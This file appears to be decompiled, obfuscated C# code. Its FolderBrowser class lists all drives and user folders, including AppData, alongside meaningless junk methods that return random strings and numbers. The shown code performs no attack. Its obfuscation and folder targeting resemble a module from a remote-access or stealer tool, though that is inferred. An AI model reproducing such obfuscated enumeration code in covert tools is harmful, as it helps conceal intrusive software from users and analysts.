using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace hkyiuiuljll;

internal class FolderBrowser : ide
{
	public List<string> GetStartingFolders()
	{
		List<string> list = (from drive in DriveInfo.GetDrives()
			select drive.Name).ToList();
		list.AddRange(GetSpecialFolders());
		return list;
	}

	private List<string> GetSpecialFolders()
	{
		return new List<string>
		{
			Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory),
			Environment.GetFolderPath(Environment.SpecialFolder.Personal),
			Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
			Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
			Environment.GetFolderPath(Environment.SpecialFolder.MyMusic),
			Environment.GetFolderPath(Environment.SpecialFolder.MyVideos)
		};
	}

	public static string WFlgZAbHsuI8Tbja9nNlgFRNRSwwh5GyJbYfv28e8xrQ5xHT8Z()
	{
		return "NhmUry7JVqjM0zSGsYZGiZpGlr23RUg2hfNVhn4nHerQbTGsizmKd1Pd7x4oN";
	}

	public static int smethod_0()
	{
		return 520053715;
	}

	public static string WTaxEguHzG0e3ia7fLfRq76RSrx42JvOoSOB8cyQyjbta60Oui()
	{
		return "ToN3Nmnw3c0DngQ8faipZqt3Hv9qLZxTElugMhXRqC1ipZA3Tb5QfdNNm6hM30M3wKyWg";
	}

	public static int AsjQyZ5o9CdsKPsXbe15HTJAf1KpIBgYGhjmDjHTaalVkuj8Yf()
	{
		return 128061181;
	}

	public static string mVxSc5KtC30wxBLUWyUtjUJ1DW9NW2wKFsSNzNMAwHc6icaQWg()
	{
		return "N89WsPWTkRNW5gd0YvxJ8ITy5YslKPE4IkJfMItkSSJHuXrOV5ieqLPvwFF82dYDrw";
	}

	public static int smethod_1()
	{
		return 449384331;
	}
}
